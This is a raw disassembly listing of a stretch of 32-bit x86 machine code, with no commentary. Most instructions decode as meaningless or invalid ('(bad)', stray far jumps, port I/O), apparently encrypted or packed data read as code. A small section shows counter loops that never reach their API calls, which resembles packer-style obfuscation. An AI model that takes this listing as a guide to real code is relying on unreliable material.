  418de9:	mov    ebx,0xde9a6727
  418dee:	lods   eax,DWORD PTR ds:[esi]
  418def:	pop    edi
  418df0:	lods   eax,DWORD PTR ds:[esi]
  418df1:	ret    0xaf97
  418df4:	jmp    0x418e09
  418df6:	aam    0x76
  418df8:	lea    edi,[edx+0x26f73f45]
  418dfe:	cwde   
  418dff:	sub    DWORD PTR [edi],esi
  418e01:	mov    dh,0xe2
  418e03:	jae    0x418d88
  418e05:	add    BYTE PTR [ecx-0x76],bh
  418e08:	sub    eax,0xe5afe94b
  418e0d:	push   ds
  418e0e:	mov    es,WORD PTR [ebp-0x7f]
  418e11:	jne    0x418d97
  418e13:	hlt    
  418e14:	xor    al,0xd3
  418e16:	xchg   DWORD PTR [ecx],eax
  418e18:	add    BYTE PTR [eax-0x763ec230],al
  418e1e:	pop    esi
  418e1f:	inc    esp
  418e20:	push   edx
  418e21:	pop    edx
  418e22:	clc    
  418e23:	mov    esp,0x41e131a4
  418e28:	adc    DWORD PTR [esi+0x49],edi
  418e2b:	and    BYTE PTR ds:0xe9afa397,ch
  418e31:	repnz out 0xb5,al
  418e34:	mov    bh,0x81
  418e36:	fcmovb st,st(1)
  418e38:	jmp    0x418eb9
  418e3a:	ins    BYTE PTR es:[edi],dx
  418e3b:	mov    dl,0x36
  418e3d:	jns    0x418e13
  418e3f:	enter  0x350f,0xca
  418e43:	cmp    bl,BYTE PTR [edi+0x3a]
  418e46:	test   BYTE PTR ds:0x10f935ab,cl
  418e4c:	or     ch,BYTE PTR [edx]
  418e4e:	push   ds
  418e4f:	(bad)  
  418e50:	push   0xfb20c186
  418e55:	pop    ss
  418e56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e57:	arpl   WORD PTR [ebx],bx
  418e59:	ins    BYTE PTR es:[edi],dx
  418e5a:	and    dl,BYTE PTR [ecx]
  418e5c:	jge    0x418e85
  418e5e:	lods   al,BYTE PTR ds:[esi]
  418e5f:	pop    esi
  418e60:	(bad)  
  418e61:	mov    ebx,0x48a68124
  418e66:	xor    DWORD PTR [ebp+0x5a],0x12
  418e6a:	or     bh,bh
  418e6c:	xor    BYTE PTR [ebx+0x15e91045],cl
  418e72:	add    eax,DWORD PTR [eax]
  418e74:	add    bl,cl
  418e76:	rol    dl,cl
  418e78:	(bad)  
  418e79:	(bad)  
  418e7b:	leave  
  418e7c:	shl    DWORD PTR [esi+0x11],1
  418e7f:	(bad)  
  418e81:	or     BYTE PTR [ebp-0x5d],bl
  418e84:	js     0x418e93
  418e86:	sar    BYTE PTR [edi+0x78],0x7b
  418e8a:	jle    0x418f04
  418e8c:	js     0x418ec9
  418e8e:	bswap  esi
  418e90:	jbe    0x418e6b
  418e92:	cld    
  418e93:	out    0x2f,al
  418e95:	idiv   DWORD PTR [eax+esi*2-0x20]
  418e99:	pop    eax
  418e9a:	lods   eax,DWORD PTR ds:[esi]
  418e9b:	popf   
  418e9c:	mov    bl,0xfb
  418e9e:	adc    edx,edi
  418ea0:	fstp   QWORD PTR [eax]
  418ea2:	sbb    al,0x94
  418ea4:	adc    ebx,ecx
  418ea6:	sub    BYTE PTR [edx+0x1c],al
  418ea9:	jge    0x418e90
  418eab:	aas    
  418eac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ead:	outs   dx,DWORD PTR ds:[esi]
  418eae:	mov    edx,DWORD PTR [edi]
  418eb0:	mov    BYTE PTR [ebx-0x4a242100],al
  418eb6:	sbb    al,BYTE PTR [ebx+edx*1+0x607baa13]
  418ebd:	pop    esi
  418ebe:	mov    DWORD PTR [ebx-0x61],eax
  418ec1:	sar    DWORD PTR [ebx-0x943f63d],1
  418ec7:	cmp    esp,ebp
  418ec9:	xchg   esi,eax
  418eca:	and    eax,0x7dfc9967
  418ecf:	push   eax
  418ed0:	or     eax,0x9a1b5494
  418ed5:	inc    ecx
  418ed6:	mov    ah,0x80
  418ed8:	fcmovnb st,st(0)
  418eda:	out    dx,eax
  418edb:	rcl    DWORD PTR [esi],1
  418edd:	mov    ds:0x359fb9ee,eax
  418ee2:	jg     0x418f0a
  418ee4:	pop    edx
  418ee5:	and    DWORD PTR [ebx-0x14],ecx
  418ee8:	push   esp
  418ee9:	fidiv  WORD PTR ss:[edx+0x394847e]
  418ef0:	and    ah,cl
  418ef2:	mov    ds:0xbfeb7897,al
  418ef7:	cwde   
  418ef8:	sbb    eax,0xbd972eaf
  418efd:	dec    ebp
  418efe:	imul   esp,eax,0x47
  418f01:	call   0xd7a0:0x8af7c2c6
  418f08:	sub    BYTE PTR [eax],0x33
  418f0b:	dec    esp
  418f0c:	mov    al,ds:0x56a8b07c
  418f11:	arpl   WORD PTR [esi-0x44],bx
  418f14:	jb     0x418f95
  418f16:	xchg   esp,eax
  418f17:	dec    edi
  418f18:	sub    al,0x71
  418f1a:	push   esi
  418f1b:	ins    DWORD PTR es:[edi],dx
  418f1c:	add    esi,0xea996dab
  418f22:	sar    al,0x45
  418f25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f26:	or     cl,al
  418f28:	jnp    0x418fa9
  418f2a:	jle    0x418fa6
  418f2c:	adc    bh,bl
  418f2e:	mov    ebx,0xcd816c2
  418f33:	js     0x418f9c
  418f35:	mov    eax,0xe2f9ecc2
  418f3a:	clc    
  418f3b:	push   0x2e
  418f3d:	adc    eax,eax
  418f3f:	rcr    BYTE PTR [edx],cl
  418f41:	dec    edx
  418f42:	push   ds
  418f43:	xchg   edx,eax
  418f44:	shr    DWORD PTR [edi],0xa7
  418f47:	inc    esp
  418f48:	jno    0x418f4d
  418f4a:	scas   al,BYTE PTR es:[edi]
  418f4b:	sbb    DWORD PTR [eax+ebx*2-0x65],0x1f
  418f50:	or     al,0xe2
  418f52:	and    eax,0x99070e66
  418f57:	mov    eax,0xcd517521
  418f5c:	popf   
  418f5d:	fidiv  DWORD PTR [eax+eiz*4+0x58cd9477]
  418f64:	xlat   BYTE PTR ds:[ebx]
  418f65:	lahf   
  418f66:	dec    esp
  418f67:	push   sp
  418f69:	fwait
  418f6a:	push   edx
  418f6b:	sar    BYTE PTR [edi],1
  418f6d:	adc    BYTE PTR ds:0xd7fccb40,bh
  418f73:	sub    edi,DWORD PTR [ebp-0x92c99d9]
  418f79:	test   eax,0x40cb35d1
  418f7e:	mov    al,0x22
  418f80:	mov    esi,0x32372ada
  418f85:	cdq    
  418f86:	push   cs
  418f87:	push   ss
  418f88:	add    al,0xa3
  418f8a:	pop    ss
  418f8b:	les    ebx,FWORD PTR [esi-0x2f415f08]
  418f91:	or     BYTE PTR [edi+eax*8+0xeb4ba2d],0x29
  418f99:	pop    es
  418f9a:	mov    ebx,0xa5684602
  418f9f:	add    eax,0x65376424
  418fa4:	mov    WORD PTR [ebx+0x2d],ss
  418fa7:	ror    dl,1
  418fa9:	push   ecx
  418faa:	jno    0x418fec
  418fac:	cmp    eax,0x1c9df307
  418fb1:	test   BYTE PTR [edx-0x78],0x78
  418fb5:	xor    esp,0xffffff8b
  418fb8:	dec    ebx
  418fb9:	iret   
  418fba:	xchg   esi,eax
  418fbb:	xchg   esi,eax
  418fbc:	or     BYTE PTR [ecx+eax*4+0xd],bl
  418fc0:	jl     0x418fe8
  418fc2:	(bad)  
  418fc3:	add    al,0xcb
  418fc5:	in     eax,0x78
  418fc7:	push   0x9eb93b81
  418fcc:	bound  ecx,QWORD PTR [ecx+0x62]
  418fcf:	retf   
  418fd0:	ss repnz aas 
  418fd3:	mov    edi,DWORD PTR [edi+0x203295a2]
  418fd9:	push   0x74
  418fdb:	dec    eax
  418fdc:	lds    esp,FWORD PTR [esi+0x262ec5ca]
  418fe2:	push   ebx
  418fe3:	jmp    0x7174:0x57470fc5
  418fea:	out    0x29,al
  418fec:	jmp    0x8cfc:0x2942133a
  418ff3:	mov    esp,0xa626572e
  418ff8:	loope  0x419078
  418ffa:	scas   eax,DWORD PTR es:[edi]
  418ffb:	pushf  
  418ffc:	mov    eax,0xdf1b2f8a
  419001:	test   DWORD PTR [edx+0x4f],esi
  419004:	scas   al,BYTE PTR es:[edi]
  419005:	out    0x5e,eax
  419007:	or     eax,0xfb4bb2e8
  41900c:	fistp  WORD PTR [ebx]
  41900e:	mov    cl,0xfc
  419010:	in     al,0xe
  419012:	mov    ds:0xca935a1b,eax
  419017:	sbb    bl,BYTE PTR [edi+0x4379d3d]
  41901d:	sbb    BYTE PTR es:[ebx+eiz*2-0x11],dl
  419022:	pop    es
  419023:	push   DWORD PTR [esi]
  419025:	mov    ah,0xbf
  419027:	popf   
  419028:	iret   
  419029:	mov    al,0x59
  41902b:	or     esp,DWORD PTR [edi-0x27957fa3]
  419031:	push   cs
  419032:	adc    ah,BYTE PTR ds:0xf1433c08
  419038:	(bad)  [ecx+0x55797b33]
  41903e:	(bad)  
  41903f:	pop    edi
  419040:	mov    ch,0xef
  419042:	popa   
  419043:	test   eax,0xd4dccd71
  419048:	xlat   BYTE PTR ds:[ebx]
  419049:	loope  0x4190a5
  41904b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41904c:	xor    esp,ebp
  41904e:	sbb    bl,bl
  419050:	fptan  
  419052:	cmp    BYTE PTR [esi-0x22679e2d],ch
  419058:	popf   
  419059:	jbe    0x419090
  41905b:	jae    0x41900f
  41905d:	jnp    0x419073
  41905f:	je     0x419051
  419061:	and    bl,BYTE PTR [ecx-0x56]
  419064:	jmp    0x419064
  419066:	hlt    
  419067:	fld    DWORD PTR [edi]
  419069:	out    0x51,al
  41906b:	push   ss
  41906c:	aam    0xc
  41906e:	bound  esp,QWORD PTR [ecx+ecx*2+0x52035283]
  419075:	and    ebx,DWORD PTR [esi-0x78]
  419078:	leave  
  419079:	popa   
  41907a:	sub    ah,ah
  41907c:	ins    DWORD PTR es:[edi],dx
  41907d:	int3   
  41907e:	sbb    al,0x43
  419080:	adc    al,0xfb
  419082:	loope  0x4190b7
  419084:	xchg   ebx,eax
  419085:	cdq    
  419086:	es mov bl,0xae
  419089:	inc    dl
  41908b:	push   ebp
  41908c:	xor    ebx,DWORD PTR [edx-0x6f]
  41908f:	add    eax,0x1ecedd4d
  419094:	or     DWORD PTR [esi+0x719143bb],eax
  41909a:	fs (bad) 
  41909c:	fld    TBYTE PTR [edx+0x1d]
  41909f:	jne    0x4190b2
  4190a1:	and    DWORD PTR [edx-0x18f057d8],esi
  4190a7:	cld    
  4190a8:	xchg   DWORD PTR [ebp-0x13463242],ecx
  4190ae:	mov    bh,0x69
  4190b0:	aam    0x1f
  4190b2:	or     eax,0x6f253572
  4190b7:	xchg   ebx,eax
  4190b8:	pop    eax
  4190b9:	int3   
  4190ba:	mov    ebp,0x13f3b0ea
  4190bf:	fbld   TBYTE PTR [edi+0x58]
  4190c2:	das    
  4190c3:	mov    edi,esp
  4190c5:	idiv   DWORD PTR [eax]
  4190c7:	scas   al,BYTE PTR es:[edi]
  4190c8:	cmp    al,0xd3
  4190ca:	mov    fs:0xbf66a74b,al
  4190d0:	rcr    DWORD PTR [ebx+0x1f],cl
  4190d3:	adc    DWORD PTR [eax],0xd5560146
  4190d9:	loopne 0x41909d
  4190db:	js     0x419150
  4190dd:	popf   
  4190de:	dec    eax
  4190df:	mov    ecx,0x9e6768ca
  4190e4:	pop    ss
  4190e5:	add    ecx,esi
  4190e7:	fild   DWORD PTR [ecx]
  4190e9:	jnp    0x41914d
  4190eb:	data16 fidiv DWORD PTR [edx-0x80]
  4190ef:	xor    al,0xd1
  4190f1:	jae    0x4190a0
  4190f3:	retf   
  4190f4:	add    DWORD PTR [ebx-0x402a5a11],edx
  4190fa:	rol    BYTE PTR [esi],0x34
  4190fd:	mov    BYTE PTR [edi-0x3379198],dh
  419103:	dec    ebp
  419104:	cmp    al,0x38
  419106:	cmp    bh,BYTE PTR [edx]
  419108:	jle    0x419169
  41910a:	xchg   ebx,eax
  41910b:	jb     0x419124
  41910d:	xor    BYTE PTR [ebx-0x67],al
  419110:	mov    ?,WORD PTR [edx]
  419112:	clc    
  419113:	js     0x41909f
  419115:	inc    edi
  419116:	xor    BYTE PTR [esi-0x21],0x7
  41911a:	int    0x3b
  41911c:	mov    edi,0x1c3fbab2
  419121:	test   al,0xc2
  419123:	cmp    eax,edx
  419125:	sub    BYTE PTR [ebp+0x2489630c],ah
  41912b:	xchg   edx,eax
  41912c:	sub    DWORD PTR [edi-0x7912aac4],eax
  419132:	(bad)  
  419133:	call   0x5d54:0xa6e87b0c
  41913a:	gs inc esi
  41913c:	pop    ds
  41913d:	inc    ebx
  41913e:	xchg   BYTE PTR [ecx+0xb40105d],bh
  419144:	dec    ecx
  419145:	call   0x9df:0x6bd570ee
  41914c:	jae    0x4190d8
  41914e:	adc    cl,BYTE PTR [eax-0x36094207]
  419154:	cld    
  419155:	call   0xa92f6933
  41915a:	ja     0x419135
  41915c:	or     al,0x8
  41915e:	jno    0x419157
  419160:	pop    ebx
  419161:	popa   
  419162:	adc    eax,0xf9234cea
  419167:	sub    ebx,DWORD PTR [ebx+ecx*8]
  41916a:	push   edi
  41916b:	call   FWORD PTR [edx+ecx*1-0x2]
  41916f:	clc    
  419170:	shr    dh,cl
  419172:	stos   DWORD PTR es:[edi],eax
  419173:	adc    DWORD PTR [esi+0x13],edx
  419176:	mov    ch,0x68
  419178:	pop    ss
  419179:	or     eax,0xa1f5c92b
  41917e:	sub    al,0xe1
  419180:	xor    esp,eax
  419182:	mov    ecx,0x720bf60d
  419187:	mov    ds:0xd0ff34ea,al
  41918c:	jmp    0x419194
  419191:	mov    eax,DWORD PTR [ebp+0x10]
  419194:	leave  
  419195:	ret    0xc
  419198:	push   ebp
  419199:	mov    ebp,esp
  41919b:	sub    esp,0x30
  41919e:	jmp    0x4193d3
  4191a3:	rcl    edx,cl
  4191a5:	ret    0xc13e
  4191a8:	into   
  4191a9:	rcl    ecx,cl
  4191ab:	daa    
  4191ac:	jle    0x419228
  4191ae:	mov    es,WORD PTR [ebx-0x1]
  4191b1:	adc    eax,0x7fc508d7
  4191b6:	js     0x4191c8
  4191b8:	jle    0x419232
  4191ba:	js     0x41921e
  4191bc:	pop    ebx
  4191bd:	loop   0x419174
  4191bf:	sar    BYTE PTR ds:0xf302a637,1
  4191c5:	aas    
  4191c6:	dec    edx
  4191c7:	jae    0x4191e4
  4191c9:	out    0xb8,eax
  4191cb:	je     0x4191d2
  4191cd:	fcom   DWORD PTR [edi-0x4a]
  4191d0:	bswap  edi
  4191d2:	inc    ebp
  4191d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191d4:	xor    BYTE PTR [ecx-0x5],0x7d
  4191d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191d9:	sti    
  4191da:	jp     0x419256
  4191dc:	out    0xd9,eax
  4191de:	jg     0x4191a7
  4191e0:	out    dx,eax
  4191e1:	mov    DWORD PTR [esi+edx*4+0x69c1ea1a],edi
  4191e8:	pop    DWORD PTR [ecx]
  4191ea:	(bad)  
  4191eb:	jmp    0x4c012ff2
  4191f0:	dec    edi
  4191f1:	into   
  4191f2:	retf   
  4191f3:	repz mov ah,0xbe
  4191f6:	dec    esp
  4191f7:	xor    eax,0xbb36c2d4
  4191fc:	pop    es
  4191fd:	ins    DWORD PTR es:[edi],dx
  4191fe:	mov    ah,0xcd
  419200:	add    dh,BYTE PTR [eax]
  419202:	popf   
  419203:	sub    al,0xc2
  419205:	cdq    
  419206:	push   edi
  419207:	mov    esi,0x35744c68
  41920c:	iret   
  41920d:	xor    esi,DWORD PTR [ebp-0x35]
  419210:	jae    0x419239
  419212:	push   ds
  419213:	cmp    BYTE PTR [edi+0x4bd9d780],al
  419219:	sbb    eax,0x9d914375
  41921e:	xlat   BYTE PTR ds:[ebx]
  41921f:	(bad)  
  419220:	adc    BYTE PTR [ebx+0x9],bl
  419223:	pop    es
  419224:	loopne 0x4191d2
  419226:	jp     0x41921f
  419228:	dec    eax
  419229:	xchg   esi,edi
  41922b:	mov    dh,0x79
  41922d:	call   0x921f8f2f
  419232:	sbb    dl,BYTE PTR [edx+0x1b]
  419235:	mov    ah,0xee
  419237:	int3   
  419238:	sub    edi,DWORD PTR [edi]
  41923a:	and    ebx,DWORD PTR [esi-0x4d]
  41923d:	mov    ch,0xed
  41923f:	add    cl,0x18
  419242:	daa    
  419243:	mov    edx,0xa786c24e
  419248:	mov    ds:0xfbf9cff9,eax
  41924d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41924e:	sbb    edx,DWORD PTR [ebx+0x57ba3fa7]
  419254:	jge    0x419206
  419256:	inc    ebx
  419257:	jno    0x41929c
  419259:	adc    bh,0xb2
  41925c:	or     esi,DWORD PTR es:[edx]
  41925f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419260:	(bad)  
  419261:	(bad)  
  419262:	mov    eax,ds:0x51255314
  419267:	adc    al,0xf3
  419269:	xor    eax,edi
  41926b:	pop    eax
  41926c:	xlat   BYTE PTR ds:[ebx]
  41926d:	push   edx
  41926e:	cmp    BYTE PTR [edx-0x7],dh
  419271:	lods   al,BYTE PTR ds:[esi]
  419272:	xchg   esi,eax
  419273:	sub    ebx,0xffffffb3
  419276:	lock jmp 0x8273:0xf25425a1
  41927e:	inc    ebx
  41927f:	mov    BYTE PTR [eax+0x258416ec],bl
  419285:	jnp    0x41922b
  419287:	mov    WORD PTR [esi-0x23927da8],?
  41928d:	mov    dh,0xd7
  41928f:	mov    ds:0xf7b7ef81,eax
  419294:	adc    al,0xa
  419296:	sbb    DWORD PTR [esi-0x2a],ebp
  419299:	iret   
  41929a:	dec    esi
  41929b:	jns    0x419234
  41929d:	ins    BYTE PTR es:[edi],dx
  41929e:	and    DWORD PTR [si],ebp
  4192a1:	imul   ecx,DWORD PTR [edi-0x4c],0xffffff80
  4192a5:	push   ebp
  4192a6:	and    ch,BYTE PTR ds:0xfc2b1fa4
  4192ac:	out    0x74,eax
  4192ae:	enter  0x96d0,0xf4
  4192b2:	out    0xdb,eax
  4192b4:	popa   
  4192b5:	pushf  
  4192b6:	push   eax
  4192b7:	push   ebx
  4192b8:	div    BYTE PTR [ebx+0x33ca0cae]
  4192be:	sub    eax,0xec75ef50
  4192c3:	cdq    
  4192c4:	test   DWORD PTR ds:[eax-0x1],esi
  4192c8:	mov    eax,ds:0x598f4c25
  4192cd:	sbb    edx,DWORD PTR [ebx-0x59]
  4192d0:	imul   ecx,DWORD PTR [edx],0x14b5368b
  4192d6:	mov    ebp,0x33ee18d9
  4192db:	into   
  4192dc:	pop    ebx
  4192dd:	pop    ebx
  4192de:	or     dl,BYTE PTR [edi+ecx*2-0x5fc2ca3]
  4192e5:	and    BYTE PTR [edi+ecx*2],ch
  4192e8:	jae    0x4192e7
  4192ea:	xchg   ebx,eax
  4192eb:	mov    edx,0x2f471c2b
  4192f0:	retf   
  4192f1:	js     0x419273
  4192f3:	in     eax,0x7f
  4192f5:	clc    
  4192f6:	sbb    bl,BYTE PTR [ebp+0x589a140c]
  4192fc:	xor    eax,0x42b7aee3
  419301:	xchg   edx,eax
  419302:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419303:	add    edi,DWORD PTR [ecx+0x14]
  419306:	xchg   ecx,eax
  419307:	ins    BYTE PTR es:[edi],dx
  419308:	jp     0x419299
  41930a:	inc    esp
  41930b:	jno    0x419339
  41930d:	push   edx
  41930e:	push   ds
  41930f:	mov    ecx,0x762c7a77
  419314:	sbb    eax,0x13350d56
  419319:	scas   al,BYTE PTR es:[edi]
  41931a:	ja     0x7790c1eb
  419320:	jo     0x419355
  419322:	sbb    esp,DWORD PTR [esi]
  419324:	adc    al,0x82
  419326:	or     eax,DWORD PTR [edi+ecx*2+0x7d]
  41932a:	rol    dh,0x2
  41932d:	cmp    al,0xc1
  41932f:	pop    ds
  419330:	mov    WORD PTR [ecx+ebx*4-0x7d5a47c6],es
  419337:	sbb    DWORD PTR [ebx],ebx
  419339:	int    0xd7
  41933b:	mov    edi,0x3ca8ac56
  419340:	push   ebp
  419341:	jbe    0x4193ba
  419343:	mov    bl,0x9e
  419345:	ror    eax,cl
  419347:	inc    BYTE PTR fs:[ecx]
  41934a:	push   0x89c2fbed
  41934f:	cmp    BYTE PTR [edx+eiz*4],bh
  419352:	push   esi
  419353:	fdiv   DWORD PTR [ebp-0x10b30c62]
  419359:	xchg   esi,eax
  41935a:	sbb    eax,0x2204020d
  41935f:	test   eax,0x49748788
  419364:	fisubr WORD PTR ds:0xcf4b1362
  41936a:	leave  
  41936b:	ficomp DWORD PTR [ecx+0x44]
  41936e:	mov    al,cl
  419370:	adc    DWORD PTR [ecx+0x2f],esi
  419373:	repnz sbb al,0x7d
  419376:	jg     0x4193bd
  419378:	sub    al,0x5d
  41937a:	mov    ecx,0x4ce43ea1
  41937f:	rcl    BYTE PTR [ecx+0x254b9a81],0xf1
  419386:	repz pop ss
  419388:	adc    eax,0xe2f61929
  41938d:	hlt    
  41938e:	cwde   
  41938f:	lods   al,BYTE PTR ds:[esi]
  419390:	ds sub al,0x6d
  419393:	xor    eax,0xf9240bfc
  419398:	(bad)  
  419399:	not    BYTE PTR [esi-0x6f4605de]
  41939f:	pop    esp
  4193a0:	int3   
  4193a1:	mov    ebx,0xef170cb8
  4193a6:	and    DWORD PTR [edx+0xace7e64],0xffffff9b
  4193ad:	lods   eax,DWORD PTR ds:[esi]
  4193ae:	sbb    eax,0xe67fd57
  4193b3:	pushf  
  4193b4:	or     eax,0x90a1b727
  4193b9:	das    
  4193ba:	sbb    al,dl
  4193bc:	(bad)  
  4193be:	in     eax,0xce
  4193c0:	pop    esp
  4193c1:	jp     0x4193b8
  4193c3:	jbe    0x419404
  4193c5:	or     eax,eax
  4193c7:	mov    edi,0x92ce41de
  4193cc:	sub    cl,BYTE PTR [edi-0x3d]
  4193cf:	leave  
  4193d0:	and    al,dl
  4193d2:	(bad)  
  4193d4:	inc    ebp
  4193d5:	cld    
  4193d6:	cmp    BYTE PTR [ebp+0x2581f89c],al
  4193dc:	jge    0x419386
  4193de:	inc    edx
  4193df:	add    BYTE PTR [eax],al
  4193e1:	add    BYTE PTR [eax],al
  4193e3:	add    BYTE PTR [ebx],dh
  4193e5:	leave  
  4193e6:	add    ecx,DWORD PTR ds:0x42a87d
  4193ec:	inc    ecx
  4193ed:	mov    DWORD PTR ds:0x42a87d,ecx
  4193f3:	cmp    DWORD PTR ds:0x42a87d,0x24
  4193fa:	jne    0x41940b
  419400:	push   0x4f45
  419405:	call   DWORD PTR ds:0x41d278
  41940b:	cmp    DWORD PTR ds:0x42a87d,0x1b
  419412:	jb     0x4193e4
  419418:	and    DWORD PTR ds:0x42a801,0x0
  419422:	jmp    0x419434
  419427:	mov    ecx,DWORD PTR ds:0x42a801
  41942d:	inc    ecx
  41942e:	mov    DWORD PTR ds:0x42a801,ecx
  419434:	cmp    DWORD PTR ds:0x42a801,0x1d
  41943b:	jae    0x419470
  419441:	cmp    DWORD PTR ds:0x42a801,0x1e
  419448:	jne    0x419461
  41944e:	push   0x42a98f
  419453:	push   DWORD PTR [ebp-0x20]
  419456:	push   0x1
  419458:	push   DWORD PTR [ebp-0xc]
  41945b:	call   DWORD PTR ds:0x41d118
  419461:	jmp    0x419427
  419466:	adc    DWORD PTR ds:0x42a7b1,0x7c2
  419470:	mov    DWORD PTR [ebp-0x18],0xf89c8539
  419477:	and    DWORD PTR ds:0x42a80d,0x0
  419481:	mov    ecx,DWORD PTR ds:0x42a80d
  419487:	inc    ecx
  419488:	mov    DWORD PTR ds:0x42a80d,ecx
  41948e:	cmp    DWORD PTR ds:0x42a80d,0x25
  419495:	jne    0x4194a6
  41949b:	push   0x42aa48
  4194a0:	call   DWORD PTR ds:0x41d27c
  4194a6:	cmp    DWORD PTR ds:0x42a80d,0x18
  4194ad:	jb     0x419481
  4194b3:	mov    ecx,DWORD PTR [ebp-0x4]
  4194b6:	mov    eax,ds:0x42a805
  4194bb:	and    DWORD PTR ds:0x42a775,eax
  4194c1:	push   ebx
  4194c2:	add    ebx,ebx
  4194c4:	mov    eax,0x7510850
  4194c9:	and    DWORD PTR ds:0x42a76d,ecx
  4194cf:	xor    ecx,eax
  4194d1:	movzx  ebx,BYTE PTR ds:0x42a779
  4194d8:	adc    DWORD PTR ds:0x42a871,ebx
  4194de:	mov    ebx,0x327298
  4194e3:	adc    DWORD PTR ds:0x42a761,0x50ad
  4194ed:	add    ecx,ebx
  4194ef:	inc    DWORD PTR ds:0x42a87d
  4194f5:	mov    DWORD PTR [ebp-0x1c],ecx
  4194f8:	mov    ecx,DWORD PTR [ebp+0x14]
  4194fb:	push   esi
  4194fc:	mov    DWORD PTR ds:0x42a7f5,0x238f
  419506:	push   edi
  419507:	test   ecx,ecx
  419509:	mov    DWORD PTR ds:0x42a839,0x1f7e
  419513:	je     0x419758
  419519:	jmp    0x41974e
  41951e:	retf   0xd03c
  419521:	(bad)
  419524:	fld    st(3)
  419526:	scas   eax,DWORD PTR es:[edi]
  419527:	inc    eax
  419528:	adc    DWORD PTR [esi+0x75],eax
  41952b:	mov    eax,ds:0xcb20bede
  419530:	jg     0x4195aa
  419532:	adc    BYTE PTR [esi+0x78],bh
  419535:	js     0x4194c7
  419537:	adc    al,0xd2
  419539:	sub    eax,0xb6edd390
  41953e:	jb     0x419518
  419540:	add    al,0x71
  419542:	cmp    al,0x3c
  419544:	jno    0x4195a2
  419546:	mov    al,ds:0xac54df4
  41954b:	or     BYTE PTR [ebx-0x2d],ah
  41954e:	dec    edx
  41954f:	sbb    al,BYTE PTR [edi+0x27]
  419552:	inc    DWORD PTR [edx+0x22]
  419555:	add    eax,0x5cf05771
  41955a:	(bad)
  41955d:	imul   esp,DWORD PTR [edi-0x6d3d3140],0x72
  419564:	leave  
  419565:	push   0xffffffd4
  419567:	pop    eax
  419568:	mov    dh,0xb9
  41956a:	pop    edx
  41956b:	imul   eax,DWORD PTR gs:[ebx-0x4f],0x2f
  419570:	xchg   BYTE PTR [edx+0x3e2735e4],dl
  419576:	out    0xf1,al
  419578:	ret    0x6311
  41957b:	xchg   esi,eax
  41957c:	int    0x23
  41957e:	repz dec ecx
  419580:	cmp    eax,0xad73f9b6
  419585:	mov    ds:0x564f3495,al
  41958a:	sub    edi,DWORD PTR ds:0xa36fca74
  419590:	mov    ds:0x217b3369,al
  419595:	and    esp,esi
  419597:	jecxz  0x41952d
  419599:	pop    edx
  41959a:	mov    bl,0x82
  41959c:	push   ebx
  41959d:	dec    edi
  41959e:	out    dx,eax
  41959f:	adc    al,0x2
  4195a2:	sub    BYTE PTR [ebp-0x4fb833d4],dl
  4195a8:	jmp    0x6f5e:0x81ddaf5
  4195af:	push   esi
  4195b0:	lods   al,BYTE PTR ds:[esi]
  4195b1:	cmp    eax,eax
  4195b3:	inc    edx
  4195b4:	test   bh,0x48
  4195b7:	sar    BYTE PTR [edi+0x3bdc6520],0xbe
  4195be:	inc    eax
  4195bf:	mov    edx,DWORD PTR [ecx+0x36ce5b8b]
  4195c5:	add    BYTE PTR [ebx],al
  4195c7:	mov    esi,0x98f4df4c
  4195cc:	nop
  4195cd:	enter  0x3cdc,0x59
  4195d1:	push   es
  4195d2:	aaa    
  4195d3:	jns    0x419627
  4195d5:	and    ebp,edx
  4195d7:	inc    esi
  4195d8:	mov    eax,ss:0xfe255e53
  4195de:	xor    eax,0x5aae5eaa
  4195e3:	jge    0x419656
  4195e5:	push   ss
  4195e6:	enter  0xaf42,0x20
  4195ea:	test   al,0x40
  4195ec:	out    dx,eax
  4195ed:	xchg   DWORD PTR [ebp-0x5e1bc96f],edx
  4195f3:	ss xor al,0x8b
  4195f6:	out    0x4d,eax
  4195f8:	stc    
  4195f9:	add    eax,esi
  4195fb:	loopne 0x41962d
  4195fd:	xor    al,0x26
  4195ff:	test   DWORD PTR [edx],edi
  419601:	retf   0x6f96
  419604:	pop    ebp
  419605:	fs jnp 0x4195f7
  419608:	ret    
  419609:	push   esp
  41960a:	mov    dl,0x5b
  41960c:	hlt    
  41960d:	mov    edx,0x81a3aa43
  419612:	int    0xa0
  419614:	pop    esi
  419615:	je     0x41961c
  419617:	nop
  419618:	mov    dl,0x52
  41961a:	pop    ebp
  41961b:	jg     0x419611
  41961d:	dec    ebp
  41961e:	xlat   BYTE PTR ds:[ebx]
  41961f:	cli    
  419620:	gs xchg esp,eax
  419622:	cwde   
  419623:	in     al,0xfa
  419625:	push   cs
  419626:	gs pop esp
  419628:	and    cl,BYTE PTR [edx+0x1b9235a9]
  41962e:	dec    esp
  41962f:	jge    0x419646
  419631:	div    eax
  419633:	sahf   
  419634:	jne    0x4195b8
  419636:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419637:	ret    
  419638:	jmp    0x41966d
  41963a:	mov    bl,0x1a
  41963c:	nop
  41963d:	adc    al,0x75
  41963f:	ins    DWORD PTR es:[edi],dx
  419640:	cwde   
  419641:	push   ebp
  419642:	xchg   BYTE PTR [ecx-0x62],bh
  419645:	dec    ebp
  419646:	call   0x5eee2577
  41964b:	mov    dl,0xf7
  41964d:	data16 mov al,0x5a
  419650:	test   BYTE PTR [ebp-0x55a21b7c],0x85
  419657:	pop    esi
  419658:	imul   DWORD PTR [ebp+edi*1+0x5f]
  41965c:	outs   dx,BYTE PTR ds:[esi]
  41965d:	hlt    
  41965e:	xor    eax,0x55f9e759
  419663:	push   0xfb548459
  419668:	mov    ds:0xedc9e6e0,eax
  41966d:	sbb    DWORD PTR [ecx+eiz*1+0x70dbc6e5],esi
  419674:	jne    0x4196c6
  419676:	cli    
  419677:	sbb    eax,0x52e89c94
  41967c:	mov    al,ds:0xd0cc508c
  419681:	push   ebx
  419682:	or     al,0x44
  419684:	mov    esi,0xf60086a2
  419689:	push   es
